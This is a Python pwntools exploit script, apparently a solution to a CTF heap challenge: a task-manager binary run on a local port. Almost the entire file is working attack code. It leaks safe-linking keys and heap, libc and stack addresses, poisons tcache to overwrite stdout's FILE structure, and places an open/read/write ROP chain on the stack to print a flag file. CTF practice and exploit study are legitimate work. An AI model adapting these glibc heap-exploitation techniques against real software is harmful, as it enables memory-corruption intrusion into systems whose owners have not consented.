from pwn import *

# p = process(["../src/chall"])
p = remote("127.0.0.1",20058)
elf = ELF("../src/chall")
libc = ELF("../src/libc.so.6")
rop = ROP(libc)

context.arch = 'amd64'
# context.log_level = 'debug'

def add_task(data):
    p.sendlineafter(b"vibe: ", str(1))
    p.sendlineafter(b"description: ",(data))
    p.sendlineafter(b"(1-5): ",str(1))

def display_task():
    p.sendlineafter(b"vibe: ", str(2).encode())

def delete_task(id):
    p.sendlineafter(b"vibe: ", str(3))
    p.sendlineafter(b"delete: ", str(id))

def modif_task(id, data):
    p.sendlineafter(b"vibe: ",str(4))
    p.sendlineafter(b"modify: ", str(id))
    p.sendlineafter(b"description: ",(data))
    p.sendlineafter(b"(1-5): ",str(1))

def modif_task2(id, data):
    p.sendlineafter(b"vibe: ",str(4))
    p.sendlineafter(b"modify: ", str(id))
    p.sendlineafter(b"description: ",(data))

def exit():
    p.sendlineafter(b"vibe: ",str(5))

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def obfuscate(p, adr):
    return p^(adr>>12)

def mangle_ptr(ptr,rotated_key):
    return ptr ^ rotated_key

# gdb.attach(p,gdbscript="""
# init-pwndbg
# br *main+249
# br *main+44
# """)

add_task("A"*0x50) # First full to leak key
add_task("B"*0x50) # Second full to leak heap address

display_task()
p.recvuntil(b"ID: 2\n")
p.recvuntil(b"B"*0x50)
heap_leaks = (u64((p.recv(8))))

p.recvuntil(b"ID: 1\n")
p.recvuntil(b"A"*0x50)
key_leaks = (u64((p.recv(8))))

heap_base = mangle_ptr(heap_leaks,key_leaks) - 0x2a0

log.info(f"Pointer Key\t: {hex(key_leaks)}")
log.info(f"Heap Base\t: {hex(heap_base)}")

# Setup Overwrite size to leak libc
add_task(b"\x00"*0x28+ b"\x31\x04"+ b"\x00"*6)

# Padding prev_in_use check
# address of stored 0x431 + 0x431 must equal 0x71
# prepare for arbitary write, we need a lot of links

for i in range(0x1f):
    add_task(b'D'*0x50)

# Store our "." to list directory, for getdents
# Store our "flag file" for read

flag = b"flag-321527cfeb1aca7161a63a77b958ffbe.txt"
# add_task(b"." + b"\x00" * 0x4f)
add_task(flag + b"\x00" * (0x50 -len(flag)))

fake_list = b"A"*0x10 + p64(mangle_ptr(heap_base+0x310,key_leaks)) + p32(3) + p32(1) + p64(0) + p64(0x71) + b"C"*0x20

# To create fake chunk with size 0x430
add_task(b'C'*0x50)

modif_task(4,fake_list + p64(mangle_ptr(heap_base+0x3b0,key_leaks)) + b"\x04")

delete_task(3) # Location fake chunk with size 0x430

# Prepare for write to _IO_2_1_stdout_ to leak stack address
delete_task(4) # Just clean the broken chunk
delete_task(5) # Just clean the broken chunk

# To make it point to index 3 that contain libc, to leaks
modif_task(6,b'D'*0x50 + p64(mangle_ptr(heap_base+0x3b0,key_leaks)) + b"\x06")

display_task()
p.recvuntil(b"ID: 3\n")
p.recvuntil(b"Description: ")
libc_leaks = u64(p.recvuntil(b"\x7f").ljust(8, b"\x00"))
libc.address = libc_leaks - 0x21ace0

log.info(f"Libc Leaks\t: {hex(libc_leaks)}")
log.info(f"Libc Base\t: {hex(libc.address)}")

# To make it point to freed index 4, we overwrite fd to point to _IO_2_1_stdout_
modif_task(6,b'D'*0x50 + p64(mangle_ptr(heap_base+0x460,key_leaks)) + b"\x06")
display_task()
stdout = p64(obfuscate(libc.symbols['_IO_2_1_stdout_'],heap_base+0x3f0))[:-2]
modif_task(5,stdout)

# Padding before point to 1
add_task(b"P"*0x50)

# Fill stdout to leaks stack
fake_file = p64(0xfbad1800)
fake_file += p64(0x0)*3
fake_file += p64(libc.sym['environ'])
fake_file += p64(libc.sym['environ']+8)

# add task manually, because leaks right after we enter fake file 
p.sendlineafter(b"vibe: ", str(1))
p.sendlineafter(b"description: ",(fake_file))
p.recv(4)
stack_leaks = u64(p.recvuntil(b"\x7f").ljust(8, b"\x00"))

# malloc(): unaligned tcache chunk detected
# address must end with 0x00 not 0x8
stack_rip = stack_leaks - 0x128

p.sendlineafter(b"(1-5): ",str(1))

log.info(f"Stack Leaks\t: {hex(stack_leaks)}")
log.info(f"Stack Rip\t: {hex(stack_rip)}")

rop = ROP(libc)
syscall = rop.find_gadget(["syscall", "ret"]).address

# Repair list links, so no looping. Point to index 0x2
modif_task(6,b'D'*0x50 + p64(mangle_ptr(heap_base+0x310,key_leaks)) + b"\x06")

# heap address flag
dir_addr = heap_base + 0x1180

# open(dir_addr, 0)
rop(rax=2, rdi=dir_addr, rsi=0)
rop.raw(syscall)

# getdents(3, dir_addr, 0x200)
# rop(rax=0x4e, rdi=3, rsi=dir_addr, rdx=0x200)
# rop.raw(syscall)

# # read(3, dir_addr, 0x200)
rop(rax=0, rdi=3, rsi=dir_addr, rdx=0x200)
rop.raw(syscall)

# write(1, dir_addr, 0x200)
rop(rax=1, rdi=1, rsi=dir_addr, rdx=0x200)
rop.raw(syscall)

log.info(f"Directory Address\t: {hex(dir_addr)}")
log.info(f"Len Payload \t: {len(rop.chain())}")

payload = b"A"*8 +rop.chain() # because we not point to rip - 0x8
payload_1 = payload[:0x50]
payload_2 = payload[0x50:0xa0]
payload_3 = payload[0xa0:]

# Because payload too long, split as 3 part

##  Part 1
# Free to fill tcache bins
delete_task(32) # delete 1
delete_task(33) # delete 2

# modif delete 2 to point to rip
modif_task(34,b'E'*0x50 + p64(mangle_ptr(heap_base+0x10a0,key_leaks)) + b"\x22")
modif_task(33,p64(obfuscate(stack_rip,heap_base+0x10a0))[:-2])
add_task(b"PADDING")
add_task(payload_1)

# Repair list links, so no looping. Point to index 31
modif_task(34,b'D'*0x50 + p64(mangle_ptr(heap_base+0xfc0,key_leaks)) + b"\x22")

# To delete our payload_1 from linked list
# index 40 is our payload
# make index 41 to point to -> 39, and skip 40
add_task(b"A"*0x50)
modif_task(41,b'D'*0x50 + p64(mangle_ptr(heap_base+0x10a0,key_leaks)) + b"\x29")

##  Part 2
# Free to fill tcache bins
delete_task(28) # delete 1
delete_task(29) # delete 2

# modif delete 2 to point to rip+0x50
modif_task(30,b'E'*0x50 + p64(mangle_ptr(heap_base+0xee0,key_leaks)) + b"\x1e")
modif_task(29,p64(obfuscate(stack_rip+0x50,heap_base+0xee0))[:-2])
add_task(b"PADDING")
add_task(payload_2)

# Repair list links, so no looping. Point to index 27
modif_task(30,b'D'*0x50 + p64(mangle_ptr(heap_base+0xe00,key_leaks)) + b"\x1e")

# To delete our payload_2 from linked list
# 44 -> 36, skip in between
add_task(b"A"*0x50)
modif_task(44,b'D'*0x50 + p64(mangle_ptr(heap_base+0x11f0,key_leaks)) + b"\x2c")

##  Part 3
# Free to fill tcache bins
delete_task(23) # delete 1
delete_task(24) # delete 2

# modif delete 1 to point to rip
modif_task(25,b'E'*0x50 + p64(mangle_ptr(heap_base+0xcb0,key_leaks)) + b"\x19")
modif_task(24,p64(obfuscate(stack_rip+0xa0,heap_base+0xcb0))[:-2])

add_task(b"PADDING")
add_task(payload_3)

# # Repair list links, so no looping. Point to index 21
# modif_task(25,b'D'*0x50 + p64(mangle_ptr(heap_base+0xbd0,key_leaks)) + b"\x19")

exit()

p.interactive()
